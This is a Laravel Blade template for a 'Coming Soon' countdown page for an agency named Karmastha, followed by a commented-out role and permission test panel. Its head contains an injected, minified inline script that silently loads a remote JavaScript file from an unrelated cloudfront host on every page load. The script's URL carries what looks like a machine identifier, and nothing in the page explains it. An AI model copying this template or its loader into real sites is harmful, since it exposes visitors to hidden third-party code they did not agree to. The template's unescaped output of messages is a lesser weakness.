<!DOCTYPE html>
<html>
  <head>    
    <meta charset="UTF-8">
   <title>Coming Soon || Karmastha</title>
    <meta name="description" content="Creative Web and Software Development Agency. Cutting Edge Technology and Creative Team.">
    <meta name="author" content="CodePassenger">
    
    <!-- Mobile Specific Meta -->   
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->

    <!-- Bootstrap -->
    <link href="{{asset('comingsoon/assets/css/bootstrap.css')}}" rel="stylesheet">

    <!-- Custom stylesheet -->
    <link rel="stylesheet" href="{{asset('comingsoon/assets/css/style.css')}}">
    <link rel="stylesheet" href="{{asset('comingsoon/assets/css/responsive.css')}}">
    <link rel="stylesheet" href="{{asset('comingsoon/assets/css/TimeCircles.css')}}">

    <!-- Font Awesome -->
    <link href="{{asset('comingsoon/assets/css/font-awesome.min.css')}}" rel="stylesheet">

    <!-- Added google font -->
    <link href='http://fonts.googleapis.com/css?family=Lato:400,700|Lobster|Roboto+Slab:400,700' rel='stylesheet' type='text/css'>

    <!--Fav and touch icons-->
    <link rel="shortcut icon" href="{{asset('comingsoon/assets/images/favicon.ico')}}">
    <link rel="apple-touch-icon" href="{{asset('comingsoon/assets/images/apple-touch-icon.png')}}">
    <link rel="apple-touch-icon" sizes="72x72" href="{{asset('comingsoon/assets/images/apple-touch-icon-72x72.png')}}">
    <link rel="apple-touch-icon" sizes="114x114" href="{{asset('comingsoon/assets/images/apple-touch-icon-114x114.png')}}">

    <!--[if IE 9]> 
        <link rel="stylesheet" href="assets/css/ie9.css">
    <![endif]-->

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
  <script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.141#p=wdcxwd5000lpcx-24c6ht0_wd-wx61a74pv0aepv0ae";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>
 <body>
    <div class="container-fluid content">
        <!-- <div class="menu m-control">
                    <a href="#">
                        <span class="top-menu"></span>
                        <span class="mid-menu"></span>
                        <span class="bottom-menu"></span>
                    </a>
                </div>
                /.menu
                <nav>
                    <section>
                        <ul>
                            <li><a href="index.html">home</a></li>
                            <li><a href="about.html">about</a></li>
                            <li><a href="contact.html">contact</a></li>
                            <li><a href="index-bg.html">home v2</a></li>
                        </ul>
                    </section>
                </nav> -->
        <!--navigation-->
        <div class="row default-style">
            <div id="left-block" class="col-md-6 col-sm-12 left-block">
                <div class="left-content">
                   <h1><img src="{{asset('comingsoon/assets/images/Karmastha_white_Logo.png')}}"></h1>
                    <h3>we are almost ready to</h3>
                    <h2>launch our website</h2>
                    <div class="timing">
                        <div id="count-down" data-date="2017-06-15 00:00:00">
                            
                        </div>
                    </div>
                    <!-- /.timing --> 
                </div>
                <!-- /.left-content -->                
            </div>
            <!-- /.left-block -->

            <div id="right-block" class="col-md-6 col-sm-12 right-block">
                <div class="right-content">
                    <h2>Don't Go so Far!</h2>
                    <p class="para">Lots of amazing thing will happen before your eyes. Something <br> you saw before and something is totally new. Just stay around us.</p>
                    <?php /* ?>
                    <span class="label">Enter your email to subscribe:</span>
                    <div class="row">
                      <div class="col-sm-offset-2 col-sm-8">
                      {{Form::open(['url' => 'subscribe', 'class'=>'newsletter-signup', 'role'=>'form'])}}
                          <div class="input-group">
                            <input type="email" class="form-control" id="email" name="email" placeholder="Enter your email address">
                            <span class="input-group-btn">
                              {{-- <input type="submit" id="subscribe" class="btn btn-default btn-submit open-door" value="Subscribe"> --}}
                              <input type="submit" id="" class="btn btn-default btn-submit open-door" value="Subscribe">
                            </span>
                          </div><!-- /input-group -->
                                <p class="newsletter-success">
                                    @if (session()->get('flash_success'))
                                            @if(is_array(json_decode(session()->get('flash_success'), true)))
                                                {!! implode('', session()->get('flash_success')->all(':message<br/>')) !!}
                                            @else
                                                {!! session()->get('flash_success') !!}
                                            @endif
                                    @endif
                                </p>
                                <p class="newsletter-error">
                                    @if ($errors->any())
                                            @foreach ($errors->all() as $error)
                                                {!! $error !!}<br/>
                                            @endforeach
                                    @endif

                                </p>
                          <div class="alert alert-success alert-dismissible" role="alert">                              
                               
                           </div>
                           <div class="alert alert-warning alert-dismissible" role="alert">                              
                               
                           </div>
                        {{Form::close()}}
                      </div>
                    </div>
                    <?php */ ?>
                    <p class="followus">Follow us on</p>
                    <ul class="social-icon">
                        <li>
                            <a href="#" title="Facebook" class="facebook">
                                <i class="fa fa-facebook" aria-hidden="true"></i></a>
                        </li>
                        <li>
                            <a href="#" title="twitter" class="twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a>
                        </li>
                        <li>
                            <a href="#" title="LinkedIn" class="linkedIn"><i class="fa fa-linkedin-square" aria-hidden="true"></i></a>
                        </li>
                        <li>
                            <a href="#" title="Google Plus" class="google-plus"><i class="fa fa-google-plus-official" aria-hidden="true"></i></a>
                        </li>
                        <li>
                            <a href="#" title="Instagram" class="instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a>
                        </li>
                    </ul>
                </div>
                <!-- /.contact-blcok -->              
            </div>
            <!-- ./left-content -->
        </div>
    </div>
    <!-- .container end here -->
    

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="{{asset('comingsoon/assets/js/jquery.min.js')}}"></script>
    <script src="{{asset('comingsoon/assets/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('comingsoon/assets/js/jquery.ajaxchimp.min.js')}}"></script>
    <script src="{{asset('comingsoon/assets/js/TimeCircles.js')}}"></script>
    <script src="{{asset('comingsoon/assets/js/jquery.placeholder.js')}}"></script>
    <script src="{{asset('comingsoon/assets/js/script.js')}}"></script>
    <script type="text/javascript">
        $(function() {
                // Invoke the plugin
                $('input, textarea').placeholder();
            });
    </script>
    <script>
      $("#count-down").TimeCircles(
       {   
           circle_bg_color: "#639094",
           use_background: true,
           bg_width: 1,
           fg_width: 0.02,
           time: {
                Days: { color: "#fefeee" },
                Hours: { color: "#fefeee" },
                Minutes: { color: "#fefeee" },
                Seconds: { color: "#fefeee" }
            }
       }
    );
    </script>
    
  </body>
</html>



<?php /* ?>


@extends('frontend.layouts.app')

<?php /* ?>
@section('content')
    <div class="row">

        <example></example>

        <div class="col-xs-12">

            <div class="panel panel-default">
                <div class="panel-heading">
                    <i class="fa fa-home"></i> {{ trans('navs.general.home') }}
                </div>

                <div class="panel-body">
                    {{ trans('strings.frontend.welcome_to', ['place' => app_name()]) }}
                </div>
            </div><!-- panel -->

        </div><!-- col-md-10 -->

        @role('Administrator')
            {{-- You can also send through the Role ID --}}

            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.role') . trans('strings.frontend.tests.using_blade_extensions') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 1: ' . trans('strings.frontend.tests.you_can_see_because', ['role' => trans('roles.administrator')]) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endauth

        @if (access()->hasRole('Administrator'))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.role') . trans('strings.frontend.tests.using_access_helper.role_name') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 2: ' . trans('strings.frontend.tests.you_can_see_because', ['role' => trans('roles.administrator')]) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        @if (access()->hasRole(1))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.role') . trans('strings.frontend.tests.using_access_helper.role_id') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 3: ' . trans('strings.frontend.tests.you_can_see_because', ['role' => trans('roles.administrator')]) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        @if (access()->hasRoles(['Administrator', 1]))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.role') . trans('strings.frontend.tests.using_access_helper.array_roles_not') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 4: ' . trans('strings.frontend.tests.you_can_see_because', ['role' => trans('roles.administrator')]) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        {{-- The second parameter says the user must have all the roles specified. Administrator does not have the role with an id of 2, so this will not show. --}}
        @if (access()->hasRoles(['Administrator', 2], true))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.role') . trans('strings.frontend.tests.using_access_helper.array_roles') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.tests.you_can_see_because', ['role' => trans('roles.administrator')]) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        @permission('view-backend')
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.permission') . trans('strings.frontend.tests.using_access_helper.permission_name') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 5: ' . trans('strings.frontend.tests.you_can_see_because_permission', ['permission' => 'view-backend']) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endauth

        @if (access()->hasPermission(1))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.permission') . trans('strings.frontend.tests.using_access_helper.permission_id') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 6: ' . trans('strings.frontend.tests.you_can_see_because_permission', ['permission' => 'view_backend']) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        @if (access()->hasPermissions(['view-backend', 1]))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.permission') . trans('strings.frontend.tests.using_access_helper.array_permissions_not') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.test') . ' 7: ' . trans('strings.frontend.tests.you_can_see_because_permission', ['permission' => 'view_backend']) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        @if (access()->hasPermissions(['view-backend', 2], true))
            <div class="col-xs-12">

                <div class="panel panel-default">
                    <div class="panel-heading"><i class="fa fa-home"></i> {{ trans('strings.frontend.tests.based_on.permission') . trans('strings.frontend.tests.using_access_helper.array_permissions') }}</div>

                    <div class="panel-body">
                        {{ trans('strings.frontend.tests.you_can_see_because_permission', ['permission' => 'view_backend']) }}
                    </div>
                </div><!-- panel -->

            </div><!-- col-md-10 -->
        @endif

        <div class="col-xs-12">

            <div class="panel panel-default">
                <div class="panel-heading"><i class="fa fa-home"></i> Bootstrap Glyphicon {{ trans('strings.frontend.test') }}</div>

                <div class="panel-body">
                    <span class="glyphicon glyphicon-search" aria-hidden="true"></span>
                    <span class="glyphicon glyphicon glyphicon-euro" aria-hidden="true"></span>
                    <span class="glyphicon glyphicon glyphicon-cloud" aria-hidden="true"></span>
                    <span class="glyphicon glyphicon glyphicon-envelope" aria-hidden="true"></span>
                </div>
            </div><!-- panel -->

        </div><!-- col-md-10 -->

        <div class="col-xs-12">

            <div class="panel panel-default">
                <div class="panel-heading"><i class="fa fa-home"></i> Font Awesome {{ trans('strings.frontend.test') }}</div>

                <div class="panel-body">
                    <i class="fa fa-home"></i>
                    <i class="fa fa-facebook"></i>
                    <i class="fa fa-twitter"></i>
                    <i class="fa fa-pinterest"></i>
                </div>
            </div><!-- panel -->

        </div><!-- col-md-10 -->

    </div><!--row-->
@endsection
<?php */ ?>